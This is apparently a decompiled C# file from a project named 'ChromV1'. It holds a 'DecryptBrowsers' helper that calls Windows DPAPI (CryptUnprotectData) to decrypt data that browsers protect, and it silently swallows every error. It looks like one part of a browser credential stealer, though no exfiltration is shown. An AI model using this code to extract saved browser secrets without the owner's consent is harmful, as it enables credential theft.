using System;
using System.Runtime.InteropServices;

namespace ChromV1
{
	// Token: 0x02000073 RID: 115
	internal sealed class DecryptAPI
	{
		// Token: 0x0600027A RID: 634 RVA: 0x0002614C File Offset: 0x0002434C
		public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			DecryptAPI.DataBlob dataBlob = default(DecryptAPI.DataBlob);
			DecryptAPI.DataBlob dataBlob2 = default(DecryptAPI.DataBlob);
			DecryptAPI.DataBlob dataBlob3 = default(DecryptAPI.DataBlob);
			DecryptAPI.CryptprotectPromptstruct cryptprotectPromptstruct = new DecryptAPI.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(DecryptAPI.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch
				{
				}
				DecryptAPI.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x0600027B RID: 635
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref DecryptAPI.DataBlob dataBlob_0, ref string string_0, ref DecryptAPI.DataBlob dataBlob_1, IntPtr intptr_0, ref DecryptAPI.CryptprotectPromptstruct cryptprotectPromptstruct_0, int int_0, ref DecryptAPI.DataBlob dataBlob_2);

		// Token: 0x02000074 RID: 116
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000160 RID: 352
			public int cbData;

			// Token: 0x04000161 RID: 353
			public IntPtr pbData;
		}

		// Token: 0x02000075 RID: 117
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x04000162 RID: 354
			public int cbSize;

			// Token: 0x04000163 RID: 355
			public int dwPromptFlags;

			// Token: 0x04000164 RID: 356
			public IntPtr hwndApp;

			// Token: 0x04000165 RID: 357
			public string szPrompt;
		}
	}
}
